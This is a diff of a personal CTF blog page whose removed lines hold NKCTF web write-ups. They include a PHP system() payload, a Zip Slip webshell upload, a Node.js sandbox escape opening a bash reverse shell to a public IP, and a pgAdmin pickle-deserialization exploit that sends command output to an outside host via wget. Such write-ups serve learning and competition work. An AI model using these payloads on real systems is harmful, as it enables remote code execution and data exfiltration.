@@ -6,7 +6,7 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>P4nY0O</title>
+  <title>pickle | P4nY0O</title>
   <meta name="author" content="P4nY0O">
   
   <meta name="description" content="hack it">
@@ -14,7 +14,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  
+  <meta property="og:title" content="pickle"/>
   <meta property="og:site_name" content="P4nY0O"/>
 
   
@@ -109,51 +109,29 @@
 
   <div class="container">
   	<div class="content">
-    	 <div class="page-header logo">
-  <h1>P4nY0O&#39;s blog<span class="blink-fast">|</span></h1>
-</div>
+    	 
 
-<div class="row page">
 
 	
+		<div class="page-header">
+			<h1> pickle</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
 	<div class="col-md-9">
 	
 
-		<div class="slogan">
+	<!-- content -->
+	<div class="mypage">		
+	  		
 
-
-		<i class="fa fa-heart blink-slow"></i>
-
-		get her shell.
-
-</div>    
-
-		<div id="top_search"></div>
-		<div class="mypage">
-		
-		<!-- title and entry -->
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/03/29/pickle/" >pickle</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-03-29  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。<br>
+	  <p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。<br>
 PVM 由三部分组成：</p>
 <ol>
 <li class="lvl-3"><strong>指令处理器</strong><br>
@@ -574,382 +552,130 @@ base64编码后，抓下购买flag的包，修改其中的cookie发送</p>
 </li>
 </ul>
 
-	
-	</div>
-  <a type="button" href="/2024/03/29/pickle/#more" class="btn btn-default more">Read More</a>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
 </div>
 
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/03/26/nkwp/" ></a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-03-26  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1>WEB</h1>
-<h1>my_first_cms</h1>
-<p>题目是的框架用的是cms-made-simple</p>
-<blockquote>
-<p>后台密码弱口令</p>
-<p>admin/Admin123</p>
-</blockquote>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>1 ) log in as admin and go to Extensions &gt; User Defined Tags &gt;</p>
-</li>
-<li class="lvl-2">
-<p>2 ) Write in Code place payload &gt; <?php echo system('id'); ?></p>
-</li>
-<li class="lvl-2">
-<p>3 ) After click run you will be see result :</p>
-</li>
-</ul>
-<p>uid=1000(admin) gid=1000(admin) groups=1000(admin) uid=1000(admin) gid=1000(admin) groups=1000(admin)</p>
-<p>漏洞文章<a target="_blank" rel="noopener" href="https://hub.packtpub.com/cms-made-simple-application-user-defined-tags/">https://hub.packtpub.com/cms-made-simple-application-user-defined-tags/</a> 省流版<a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/177241/CMS-Made-Simple-2.2.19-Remote-Code-Execution.html">https://packetstormsecurity.com/files/177241/CMS-Made-Simple-2.2.19-Remote-Code-Execution.html</a></p>
-<h3 id="工作原理">工作原理</h3>
-<p>用户自定义标签通过将PHP代码与Smarty模板引擎识别的标签关联起来。当Smarty解析模板遇到该标签时，它会执行相关的PHP代码，并将标签标记替换为PHP代码的输出</p>
-<p>一开始我自己找到的文章不对，是这个框架的另一个SSTI洞，后来5x给出了正确的漏洞文章，按步骤找到对应页面粘贴上payload，换成 <code>ls /</code>然后<code>cat flag</code>皆可</p>
-<p>![40b9384456aeae3016062060cf03580](C:\Users\27104\Documents\WeChat Files\scot975687\FileStorage\Temp\40b9384456aeae3016062060cf03580.png)</p>
-<h1>用过就是熟悉</h1>
-<blockquote>
-<p>用户账号密码在数据库文件中</p>
-</blockquote>
-<p>admin/!@!@!@!@NKCTFNKCTFChu0</p>
-<p>guest/!@!@!@!@NKCTFChu0</p>
-<p>在本地搞个压缩包，里面放webshell</p>
-<p>php一句话即可</p>
-<p>登录后台，将压缩包上传</p>
-<p><a target="_blank" rel="noopener" href="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=YTYzZTNlNjc2NmFlMGU4N2M3ZTEyNTJmZjdjNmFiYjFfVEpETWd3RVdpenAxVUdlR3dpNjE0OHlBOEVuS2VpYllfVG9rZW46U1p4QWJHYVdXb05MRTl4eFdEZWNJNU5JbkdjXzE3MTEyOTM5OTM6MTcxMTI5NzU5M19WNA">https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=YTYzZTNlNjc2NmFlMGU4N2M3ZTEyNTJmZjdjNmFiYjFfVEpETWd3RVdpenAxVUdlR3dpNjE0OHlBOEVuS2VpYllfVG9rZW46U1p4QWJHYVdXb05MRTl4eFdEZWNJNU5JbkdjXzE3MTEyOTM5OTM6MTcxMTI5NzU5M19WNA</a></p>
-<p>修改数据包中的pathto为%7D%2F%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f</p>
-<p>之后就能跨目录解压到</p>
-<p>![1da6d831c4a17030fdbe4fb2765e01a](C:\Users\27104\Documents\WeChat Files\scot975687\FileStorage\Temp\1da6d831c4a17030fdbe4fb2765e01a.png)</p>
-<p><a target="_blank" rel="noopener" href="http://8629d181-00ee-4ebd-8caa-c23531b6d2a1.node.nkctf.yuzhian.com.cn/">http://8629d181-00ee-4ebd-8caa-c23531b6d2a1.node.nkctf.yuzhian.com.cn/</a>}/shell.php</p>
-<p>![3d8382a0cabc9f8c87831f01ef0e3f9](C:\Users\27104\Documents\WeChat Files\scot975687\FileStorage\Temp\3d8382a0cabc9f8c87831f01ef0e3f9.png)</p>
-<blockquote>
-<p>这题主要利用的漏洞是压缩包slip</p>
-</blockquote>
-<p>Zip Slip是一个广泛存在的漏洞，除了Java语言，JavaScript，Ruby，.NET和Go都有此问题。</p>
-<p>利用此漏洞有两个前提：</p>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>有恶意的压缩文件（这一点我们可以自己构造）</p>
-</li>
-<li class="lvl-2">
-<p>提取代码不会执行目录检查。</p>
-</li>
-</ul>
-<p>恶意的压缩文件一般包含<code>../</code>目录，从而解压时会跳出当前目录。</p>
-<p>提取代码一般会得到压缩文件中的文件目录，如果不对这些目录进行校验则会出现slip问题</p>
-<p>现在很多cms中还存在这种漏洞</p>
-<h1>最简单的CTF</h1>
-<p>题目有一个js代码的提交窗口，可以填入任意代码submit，访问/secret路由有源码，源码有waf</p>
-<p>反弹shell,大小写绕过,getOwnPropertyDescriptor获取所有属性值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const code = `throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function() &#123;</span><br><span class="line">        const cc = arguments.callee.caller;</span><br><span class="line">        const p = (cc.constructor.constructor(&#x27;return PROCESS&#x27;.toLowerCase()))();</span><br><span class="line">        return Object.getOwnPropertyDescriptor(p.mainModule.require(&#x27;child_Process&#x27;.toLowerCase()), &#x27;EXEC&#x27;.toLowerCase()).value(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.115.225.25/2333 0&gt;&amp;1&quot;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
-<p>![a366152fa528f42583c784c3d52d3c4](C:\Users\27104\Documents\WeChat Files\scot975687\FileStorage\Temp\a366152fa528f42583c784c3d52d3c4.png)</p>
-<h1>attack_tacooooo</h1>
-<p><a target="_blank" rel="noopener" href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/</a> 没什么好说的，真的就是按着文章打，经复现测试少一步都不行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b&#x27;\\\\x80\\\\x04\\\\x95&#x27;</span><br><span class="line">    b += struct.pack(&#x27;L&#x27;, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b&#x27;\\\\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(platform)) + platform.encode()</span><br><span class="line">    b += b&#x27;\\\\x94\\\\x8c\\\\x06system\\\\x94\\\\x93\\\\x94&#x27;</span><br><span class="line">    b += b&#x27;\\\\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b&#x27;\\\\x94\\\\x85\\\\x94R\\\\x94.&#x27;</span><br><span class="line">    print(b)</span><br><span class="line">    return b</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if len(sys.argv) != 2:</span><br><span class="line">        exit(f&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;)</span><br><span class="line">    HOST = &#x27;1.1.1.1:8000&#x27;</span><br><span class="line">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(&#x27;posix&#x27;, f&quot;wget &lt;http://121.40.98.237:7777&gt; --post-data=`ls /usr/bin|base64|tr -d &#x27;\\\\n&#x27;`&quot;))</span><br></pre></td></tr></table></figure>
-<p>运行上面的<code>pickler.py</code></p>
-<p>得到posix.pickle文件后</p>
-<p>登录web服务器，账号密码分别为<code>tacooooo@qq.com</code>/tacooooo`</p>
-<p>点</p>
-<p>将生成的posix.pickle文件上传</p>
-<p>然后发送下面的数据包,就能执行命令了，看服务器对应的回显就行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /browser/ HTTP/1.1</span><br><span class="line">Host: ee86fb88-5fd5-4f9c-9f6d-68b490e101d8.node.nkctf.yuzhian.com.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: &lt;http://9dbb3625-3439-4b7c-bea5-29ec33888059.node.nkctf.yuzhian.com.cn/login&gt;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: pga4_session=../storage/tacooooo_qq.com/posix.pickle!a; PGADMIN_LANGUAGE=zh</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
-	
-	</div>
-  <a type="button" href="/2024/03/26/nkwp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/03/25/NKCTF-WP/" >NKCTF_WP</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-03-25  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>其实这次比赛真正思考的时间不多，和学会的内部赛冲突了，少了8个小时，打完内部赛之后就跟着学长们的思路复现了。这两天给大脑输入了太多东西，学长们的思路也没来的及消化，就借这篇半引用的WP帮自己梳理一下，也存档一下</p>
-<h1>WEB</h1>
-<h1>my_first_cms</h1>
-<p>题目是的框架用的是cms-made-simple</p>
-<blockquote>
-<p>后台密码</p>
-<p>admin/Admin123</p>
-<p>1 ) log in as admin and go to Extensions &gt; User Defined Tags &gt;</p>
-<p>2 ) Write in Code place payload &gt; <code>&lt;?php echo system('id'); ?&gt;</code></p>
-<p>3 ) After click run you will be see result :</p>
-<p>uid=1000(admin) gid=1000(admin) groups=1000(admin) uid=1000(admin) gid=1000(admin) groups=1000(admin)</p>
-</blockquote>
-<p>漏洞文章<a target="_blank" rel="noopener" href="https://hub.packtpub.com/cms-made-simple-application-user-defined-tags/">https://hub.packtpub.com/cms-made-simple-application-user-defined-tags/</a><br>
-省流版<a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/177241/CMS-Made-Simple-2.2.19-Remote-Code-Execution.html">https://packetstormsecurity.com/files/177241/CMS-Made-Simple-2.2.19-Remote-Code-Execution.html</a></p>
-<h3 id="工作原理">工作原理</h3>
-<p>用户自定义标签通过将PHP代码与Smarty模板引擎识别的标签关联起来。当Smarty解析模板遇到该标签时，它会执行相关的PHP代码，并将标签标记替换为PHP代码的输出</p>
-<p>一开始我自己找到的文章不对，是这个框架的另一个SSTI洞，后来5x给出了正确的漏洞文章，按步骤找到对应页面粘贴上payload，换成 <code>ls /</code>然后<code>cat flag</code>皆可</p>
-<p><img src="/pic/flag1.png" alt="flag1"></p>
-<p>吐槽一下自己猜弱口令经验太少，一开始admin123都试了居然没试Admin123</p>
-<h1>用过就是熟悉</h1>
-<blockquote>
-<p>用户账号密码在数据库文件中</p>
-<p>admin/!@!@!@!@NKCTFNKCTFChu0</p>
-<p>guest/!@!@!@!@NKCTFChu0</p>
-<p>在本地搞个压缩包，里面放webshell</p>
-<p>登录后台，将压缩包上传</p>
-<p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=YTYzZTNlNjc2NmFlMGU4N2M3ZTEyNTJmZjdjNmFiYjFfVEpETWd3RVdpenAxVUdlR3dpNjE0OHlBOEVuS2VpYllfVG9rZW46U1p4QWJHYVdXb05MRTl4eFdEZWNJNU5JbkdjXzE3MTEyOTM5OTM6MTcxMTI5NzU5M19WNA" alt=""></p>
-<p>修改数据包中的pathto为%7D%2F%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f</p>
-<p>之后就能跨目录解压到</p>
-<p><a target="_blank" rel="noopener" href="http://8629d181-00ee-4ebd-8caa-c23531b6d2a1.node.nkctf.yuzhian.com.cn/">http://8629d181-00ee-4ebd-8caa-c23531b6d2a1.node.nkctf.yuzhian.com.cn/</a>}/shell.php</p>
-<p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=NTk5YzkwOGYzM2Q2YjQ2ZjdiZGYyMGRkOGQ2Y2MyZmVfa29Sem5jeUNJRENPVGl5aUdwazVHeEdpWm4yejdNNzdfVG9rZW46WWZyYWIxWG1Cb2g1WUh4alVxc2NzMXA4bkdFXzE3MTEyOTM5OTM6MTcxMTI5NzU5M19WNA" alt=""></p>
-</blockquote>
-<p>这题主要利用的漏洞是压缩包slip</p>
-<p>Zip Slip是一个广泛存在的漏洞，除了Java语言，JavaScript，Ruby，.NET和Go都有此问题。</p>
-<p>利用此漏洞有两个前提：</p>
-<ul class="lvl-0">
-<li class="lvl-2">
-<p>有恶意的压缩文件（这一点我们可以自己构造）</p>
-</li>
-<li class="lvl-2">
-<p>提取代码不会执行目录检查。</p>
-</li>
-</ul>
-<p>恶意的压缩文件一般包含<code>../</code>目录，从而解压时会跳出当前目录。</p>
-<p>提取代码一般会得到压缩文件中的文件目录，如果不对这些目录进行校验则会出现slip问题</p>
-<pre><code>学长说这种漏洞在实际场景中还是很常见的，很多cms还有这种洞
-
-参考文献：
-</code></pre>
-<p>​</p>
-<p><img src="/pic/ck.png" alt="ck"></p>
-<p>这题要重视</p>
-<h1>最简单的CTF</h1>
-<p>题目有一个js代码的提交窗口，可以填入任意代码submit，源码有waf</p>
-<blockquote>
-<h1>反弹shell,大小写绕过,getOwnPropertyDescriptor获取所有属性值</h1>
-</blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> code = <span class="string">`throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">    get: function() &#123;</span></span><br><span class="line"><span class="string">        const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">        const p = (cc.constructor.constructor(&#x27;return PROCESS&#x27;.toLowerCase()))();</span></span><br><span class="line"><span class="string">        return Object.getOwnPropertyDescriptor(p.mainModule.require(&#x27;child_Process&#x27;.toLowerCase()), &#x27;EXEC&#x27;.toLowerCase()).value(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.115.225.25/2333 0&gt;&amp;1&quot;&#x27;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;)</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>
-<p>sorry这题还没机会看太多源码，不是太清楚为什么要打这段payload<br>
-收获最多的是逼着我当晚上腾讯云搞了个服务器，终于可以在公网接收反弹shell了</p>
-<p><img src="/pic/shell2.png" alt="shell2"></p>
-<p><img src="/pic/shell1.png" alt="shell1"></p>
-<h1>attack_tacooooo</h1>
-<p><a target="_blank" rel="noopener" href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/Details">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/Details</a></p>
-<h3 id="Root-Cause-Analysis">Root Cause Analysis</h3>
-<blockquote>
-<p>pgAdmin4 uses a file-based session management approach. The session files are saved on disk as pickle objects. When a user performs a request, the value of the session cookie <code>pga4_session</code> is used to retrieve the file, then it’s content is deserialized, and finally its signature verified.</p>
-</blockquote>
-<blockquote>
-<p>The <code>ManagedSessionInterface</code> class implements flask’s <code>SessionInterface</code> to read the user’s cookie and translate it into their session</p>
-</blockquote>
-<blockquote>
-<p>The cookie value is split in 2 parts at the first <code>!</code> character. The first part is the session ID (<code>sid</code>), while the second is the session digest.</p>
-</blockquote>
-<blockquote>
-<p>The vulnerability lies in the <code>FileBackedSessionManager.get</code> method that loads session files by concatenating the <code>sessions</code> folder - located inside the pgAdmin4 <code>DATA_DIR</code> - with the session ID. Precisely, the two values are concatenated using the <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/os.path.html#os.path.join"><code>os.path.join</code></a> function.</p>
-</blockquote>
-<blockquote>
-<p>This function has two weaknesses:</p>
-</blockquote>
-<ul class="lvl-0">
-<li class="lvl-2">
-<blockquote>
-<p>It does not set a trusted base-path which should not be escaped, therefore <code>os.path.join(&quot;/opt/safe/&quot;, &quot;../../etc/passwd&quot;)</code> returns <code>/etc/passwd</code>.</p>
-</blockquote>
-</li>
-<li class="lvl-2">
-<blockquote>
-<p>It uses the right-most absolute path in its arguments as the root path, therefore <code>os.path.join(&quot;./safe/&quot;, &quot;do_not_escape_from_here&quot;, &quot;/etc/passwd&quot;)</code> returns <code>/etc/passwd</code>.</p>
-</blockquote>
-</li>
-</ul>
-<p>没什么好说的，真的就是按着文章打，经复现测试少一步都不行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b<span class="string">&#x27;\x80\x04\x95&#x27;</span></span><br><span class="line">    b += struct.pack(<span class="string">&#x27;L&#x27;</span>, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b<span class="string">&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, len(platform)) + platform.encode()</span><br><span class="line">    b += b<span class="string">&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span></span><br><span class="line">    b += b<span class="string">&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b<span class="string">&#x27;\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != 2:</span><br><span class="line">        <span class="built_in">exit</span>(f<span class="string">&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;</span>)</span><br><span class="line">    HOST = <span class="string">&#x27;1.1.1.1:8000&#x27;</span></span><br><span class="line">    with open(<span class="string">&#x27;posix.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(<span class="string">&#x27;posix&#x27;</span>, f<span class="string">&quot;wget http://121.40.98.237:7777 --post-data=`ls /usr/bin|base64|tr -d &#x27;\n&#x27;`&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>运行上面的<code>pickler.py</code></p>
-<p>得到posix.pickle文件后</p>
-<p>登录web服务器，账号密码分别为<code>tacooooo@qq.com</code>/tacooooo`</p>
-<p>点</p>
-<p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=NzI5OGYyM2Y5ZmI1NzQ5OWI2OTc5MzE0MTlmYjM0YjNfaHkwWTdHbmxWS0JrNlltS2pNVlhwQTNBWENJbmRCdWJfVG9rZW46TlVFYWJYWHN4bzV3RVN4Z0xtMGN0YWRIbnc1XzE3MTEyOTU1MTM6MTcxMTI5OTExM19WNA" alt=""></p>
-<p>将生成的posix.pickle文件上传</p>
-<p><img src="https://m5e1ff9fy3.feishu.cn/space/api/box/stream/download/asynccode/?code=MmExMWViZjkyNzQ5OWEwN2Q0NjU2MTFjMzMzYWQ0ZmZfSzAwbDROWE5Iamx0WDljS0s5NHE4THE0cHJsc3dENmRfVG9rZW46Q2ROT2JWaWFMb0lVaHB4ZlpyWmNQTVVWbmFiXzE3MTEyOTU1MTM6MTcxMTI5OTExM19WNA" alt=""></p>
-<p>然后发送下面的数据包,就能执行命令了，看服务器对应的回显就行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /browser/ HTTP/1.1</span><br><span class="line">Host: ee86fb88-5fd5-4f9c-9f6d-68b490e101d8.node.nkctf.yuzhian.com.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://9dbb3625-3439-4b7c-bea5-29ec33888059.node.nkctf.yuzhian.com.cn/login</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: pga4_session=../storage/tacooooo_qq.com/posix.pickle!a; PGADMIN_LANGUAGE=zh</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>在上周的TLS招新赛也出现了pickle反序列化，一直没找到时间真正学习，要把这个提上日程了</p>
-
-	
-	</div>
-  <a type="button" href="/2024/03/25/NKCTF-WP/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/03/21/hello-world/" >first blog</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-03-21  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1>第一篇博客</h1>
-<p>稍微记录一下，最开始本来没有搭建个人博客的想法的，以前不太清楚个人博客的定位是什么，因为如果不是大牛的话好像也没什么人看。但是上周几场比赛把自己打自闭了之后还是深刻地认识到了自己与大佬之间的差距，又燃起了许多学习的欲望。上学期的学习进度总是不太持续，一段时间猛猛学又一段毫无斗志，这次也是希望借由博客来帮助自己持续:<em>输入–&gt;输出</em> 这个过程吧，后面就把一些学习笔记记录上来，或许也会继续更一些生活学习的碎碎念哈哈哈</p>
-<p>Anyway搭博客的过程虽然有点折腾，但是比起配CTF各种奇奇怪怪的脚本，工具的环境来说还是很简易了哈哈，基于githubpage的搭建也让我一个脚本纯靠CV大法的人学到一些github仓库的上传，管理操作.</p>
-<p>过段时间比较有空了再慢慢捣鼓完善下网站的功能，这周的时间真的被榨干了，一堆作业和周末的比赛和web分享会</p>
-<p>感谢搭建过程给予帮助的学长！</p>
-<p>3500：<a target="_blank" rel="noopener" href="https://huanxin-chen.github.io/">3500</a></p>
-<p>顺虞：<a target="_blank" rel="noopener" href="https://liu1272.github.io/about/">Robin</a></p>
-
-	
-	</div>
-  <a type="button" href="/2024/03/21/hello-world/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-
-		</div>
-
-		<!-- pagination -->
-		<div>
-  		<center>
-		<div class="pagination">
-
-   
-</div>
-
-  		</center>
-		</div>
-
-		
-		
-	</div> <!-- col-md-9 -->
-
-	
-		<div class="col-md-3">
-	<div id="sidebar">
-	
-			
-  <div id="site_search">
-   <div class="form-group">
-    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
-   </div>  
-  <div id="local-search-result"></div>
-  </div>
-
-
-		
-			
-	<div class="widget">
-		<h4>Categories</h4>
-		<ul class="tag_box inline list-unstyled">
-		
-			<li><a href="/categories/Daily/">Daily<span>1</span></a></li>
-		
-		</ul>
 	</div>
 
-		
-			
-	<div class="widget">
-		<h4>Tag Cloud</h4>
-		<ul class="tag_box inline list-unstyled">		
-		
-			<li><a href="/tags/WP/">WP<span>1</span></a></li>
-		
-			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
-		
-			<li><a href="/tags/碎碎念/">碎碎念<span>1</span></a></li>
-		
-		 
-		</ul>
-	</div>
+	
+	<span id="/2024/03/29/pickle/" class="leancloud-visitors view" data-flag-title="pickle">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
 
+	<div class="pagination">
 
-		
-			
-<div class="widget">
-  <h4>Recent Posts</h4>
-  <ul class="entry list-unstyled">
     
-      <li>
-        <a href="/2024/03/29/pickle/" ><i class="fa fa-file-o"></i>pickle</a>
-      </li>
     
-      <li>
-        <a href="/2024/03/26/nkwp/" ><i class="fa fa-file-o"></i></a>
-      </li>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
-      <li>
-        <a href="/2024/03/25/NKCTF-WP/" ><i class="fa fa-file-o"></i>NKCTF_WP</a>
-      </li>
-    
-      <li>
-        <a href="/2024/03/21/hello-world/" ><i class="fa fa-file-o"></i>first blog</a>
-      </li>
-    
-  </ul>
-</div>
 
-		
-			
-<div class="widget">
-	<h4>Links</h4>
-	<ul class="blogroll list-unstyled">
-	
-		<li><i class="false"></i><a href="https://huanxin-chen.github.io/" title="" target="_blank"]);">3500</a></li>
-	
-		<li><i class=""></i><a href="https://liu1272.github.io" title="" target="_blank"]);">顺虞</a></li>
-	
-		<li><i class=""></i><a href="https://afhu23326.gitee.io/my-hexo-fluid/" title="" target="_blank"]);">afhu</a></li>
-	
-		<li><i class=""></i><a href="https://xx5xx.top/" title="" target="_blank"]);">5xxxxx</a></li>
-	
-	</ul>
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/03/26/nkwp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
 </div>
 
 
-		
-	</div> <!-- sidebar -->
-</div> <!-- col-md-3 -->
+    </center>
